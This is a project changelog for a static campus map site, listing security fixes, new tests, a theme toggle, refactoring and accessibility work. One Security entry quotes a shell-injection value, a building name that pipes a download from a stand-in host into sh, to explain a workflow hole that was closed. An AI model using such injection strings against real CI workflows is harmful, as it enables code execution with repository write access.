# Changelog

All notable changes to this project are documented here.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
Commit messages follow [Conventional Commits](https://www.conventionalcommits.org/),
so this file can be generated from history if the project ever adopts automated
releases.

This project is a static site rather than a published package, so it is not
versioned with semantic-release. Entries are grouped by the date they landed on
`main`.

## [Unreleased]

Everything below is on `refactor/core-modernization` and not yet merged.

### Security

- **Closed a shell-injection vector in the contribution workflow.** A crafted
  building name (e.g. `"; curl evil.sh | sh; #`) was interpolated into a
  `run:` block via `${{ steps.parse.outputs.name }}` and executed with
  repository write access and a `GITHUB_TOKEN`. GitHub substitutes expressions
  before the shell parses them, so the value was pasted in as source code.
  Untrusted values now reach the shell only through `env:`.
- **Closed an arbitrary file write.** The `**File:**` line in an issue body was
  assigned straight to the write target with no containment check, letting a
  contribution target any path in the repository. Since JSON is valid YAML, the
  workflow file itself was a reachable target. Destination paths are now derived
  from validated parts and the field is ignored.
- **Closed a `$GITHUB_OUTPUT` forging vector.** An unescaped name was piped into
  the step-output stream, so a newline could forge `success=true`. Names are
  stripped of control characters and outputs use the delimiter form.
- **Fixed a broken path regex.** `[^\x6]+` means "not x, not 6"; `[^\x60]+`
  ("not a backtick") was intended. Any path containing an `x` or a `6` failed to
  match at all, making behaviour depend on the characters in a filename.
- **Removed `@turf/turf@7`.** Loaded on every visit to `verify/` and never
  called once — roughly 500KB of dead weight pinned to a floating major version.
- **Pinned all CDN assets with Subresource Integrity hashes** and
  `crossorigin`, so a swapped or compromised CDN file is rejected by the browser
  rather than executed.
- Reduced workflow permissions to the minimum, and moved parsing/validation into
  a pure module so the security rules are directly testable.

### Added

- **A light theme, and a toggle** (top-left). Follows `prefers-color-scheme`
  until an explicit choice is made, which is then remembered. Dark remains the
  default and the original design.
- **`src/geo.js` and `src/routing.js`** — the routing engine as pure,
  dependency-free modules that run in Node and the browser.
- **A test suite** where there was none: 63 tests covering geodesics, graph
  construction, bidirectional Dijkstra, entry-point pairing, and every closed
  vulnerability. Runs via `node tests/run.js` or by opening `tests/index.html`.
  No dependencies to install.
- **CI** — runs the tests, validates every committed `data/` entry against the
  same rules the contribution pipeline enforces, and fails if `mapData.js` has
  drifted out of sync with `data/`.
- **`.github/scripts/validate-data.js`** — dataset-wide validation including id
  uniqueness.
- `ARCHITECTURE.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`,
  `DISASTER_RECOVERY.md`, and this file.
- `.gitattributes` and `.editorconfig`. The repo had neither, so a Windows
  contributor committed CRLF and broke the Action's bash steps in a way that
  only reproduced on the Linux runner.

### Changed

- **Extracted the routing engine from `app.js`** (2,153 → ~1,870 lines). Moved
  verbatim, not rewritten: verified by differential testing against the original
  on real campus data — identical graphs, 367 building pairs routed, zero
  mismatches. `geo.metersBetween` reimplements Leaflet's exact spherical model
  and is bitwise-identical across 20,000 random pairs, because the routing
  thresholds were hand-tuned against Leaflet's numbers.
- **Centralised every colour into theme tokens.** `style.css` held 39 raw colour
  literals across 16 distinct values; there are now none outside the two theme
  blocks.
- **Rewrote the README.** It described an architecture that no longer existed
  and claimed the app "works offline", which was never true — it fetches Leaflet
  from unpkg and satellite tiles from Esri.

### Fixed

- **Accessibility.** The two selects driving the entire Directions feature had
  no label. Icon-only controls announced as punctuation. No `h1`, no landmarks,
  no focus indicators anywhere. Contribute menu items announced as "pushpin Add
  Landmark". Selected state was conveyed by colour alone, invisible to a screen
  reader. Route results appeared silently. All fixed and verified; every
  text/background pairing in both themes now measures WCAG AA or better.
- **`landmarkId: null` was wrongly rejected** by the new validator. Found by
  running it against the 261 real committed entries: it is a legitimate shape the
  app itself writes for a building traced directly rather than expanded from a
  landmark.
- **The panel toggle dropped its own accessibility markup** — its handler
  assigned `innerHTML` directly, discarding the `aria-hidden` wrapper on every
  click.

### Removed

- `@turf/turf@7` (never called).
- `--paper` CSS variable (defined, never used).
- `#93a1ab` as a literal (a duplicate of `--text-dim`).
- Three module aliases in `app.js` that nothing referenced.

---

## Prior history

Before this branch, changes were not tracked in a changelog. See
`git log` for the project's history, which begins with the initial KML import
and the PR-based contribution flow.
